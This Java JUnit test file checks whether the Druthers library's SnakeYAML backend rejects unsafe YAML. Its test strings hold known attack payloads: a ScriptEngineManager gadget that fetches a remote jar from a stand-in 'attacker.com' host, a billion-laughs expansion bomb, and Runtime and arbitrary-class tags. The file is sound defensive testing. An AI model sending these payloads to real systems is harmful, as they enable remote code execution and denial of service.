package org.peakaboo.framework.druthers;

import org.junit.Test;
import org.peakaboo.framework.druthers.serialize.DruthersSerializerBackend;
import org.peakaboo.framework.druthers.serialize.DruthersSnakeYamlBackend;

/**
 * Diagnostic test to understand SnakeYAML security behavior.
 */
public class SecurityDiagnosticTest {

	@Test
	public void diagnoseScriptEngineTag() {
		DruthersSerializerBackend backend = new DruthersSnakeYamlBackend();

		String yaml = """
			!!javax.script.ScriptEngineManager [
			  !!java.net.URLClassLoader [[
			    !!java.net.URL ["http://attacker.com/malicious.jar"]
			  ]]
			]
			""";

		System.out.println("=== Testing !!javax.script.ScriptEngineManager ===");
		try {
			Object result = backend.deserialize(yaml, true, null, Object.class);
			System.out.println("❌ SECURITY ISSUE: Deserialization succeeded!");
			System.out.println("Result type: " + (result != null ? result.getClass().getName() : "null"));
			System.out.println("Result value: " + result);
		} catch (Exception e) {
			System.out.println("✅ SECURE: Exception thrown as expected");
			System.out.println("Exception type: " + e.getClass().getName());
			System.out.println("Exception message: " + e.getMessage());
		}
	}

	@Test
	public void diagnoseCustomClassTag() {
		DruthersSerializerBackend backend = new DruthersSnakeYamlBackend();

		String yaml = """
			!!org.peakaboo.framework.druthers.DruthersBackendCompatibilityTests$SimpleObject
			name: injected
			value: 999
			flag: true
			""";

		System.out.println("\n=== Testing !!org.peakaboo.* custom class ===");
		try {
			Object result = backend.deserialize(yaml, true, null, Object.class);
			System.out.println("❌ SECURITY ISSUE: Deserialization succeeded!");
			System.out.println("Result type: " + (result != null ? result.getClass().getName() : "null"));
			System.out.println("Result value: " + result);
		} catch (Exception e) {
			System.out.println("✅ SECURE: Exception thrown as expected");
			System.out.println("Exception type: " + e.getClass().getName());
			System.out.println("Exception message: " + e.getMessage());
		}
	}

	@Test
	public void diagnoseBillionLaughs() {
		DruthersSerializerBackend backend = new DruthersSnakeYamlBackend();

		String yaml = """
			a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
			b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
			c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
			d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]
			root: *d
			""";

		System.out.println("\n=== Testing Billion Laughs Attack ===");
		System.out.println("Expected expansions:");
		System.out.println("Level a: 10 items");
		System.out.println("Level b: 10 × 10 = 100 items");
		System.out.println("Level c: 100 × 10 = 1,000 items");
		System.out.println("Level d: 1,000 × 10 = 10,000 items");
		System.out.println("Limit is 50 aliases, should fail at level b or c\n");

		try {
			Object result = backend.deserialize(yaml, true, null, Object.class);
			System.out.println("❌ SECURITY ISSUE: Deserialization succeeded!");
			System.out.println("Result type: " + (result != null ? result.getClass().getName() : "null"));
		} catch (Exception e) {
			System.out.println("✅ SECURE: Exception thrown as expected");
			System.out.println("Exception type: " + e.getClass().getName());
			System.out.println("Exception message: " + e.getMessage());
		}
	}

	@Test
	public void diagnoseRuntimeTag() {
		DruthersSerializerBackend backend = new DruthersSnakeYamlBackend();

		String yaml = """
			!!java.lang.Runtime
			name: malicious
			""";

		System.out.println("\n=== Testing !!java.lang.Runtime (should be blocked) ===");
		try {
			Object result = backend.deserialize(yaml, true, null, Object.class);
			System.out.println("❌ SECURITY ISSUE: Deserialization succeeded!");
			System.out.println("Result type: " + (result != null ? result.getClass().getName() : "null"));
			System.out.println("Result value: " + result);
		} catch (Exception e) {
			System.out.println("✅ SECURE: Exception thrown as expected");
			System.out.println("Exception type: " + e.getClass().getName());
			System.out.println("Exception message: " + e.getMessage());
		}
	}

}
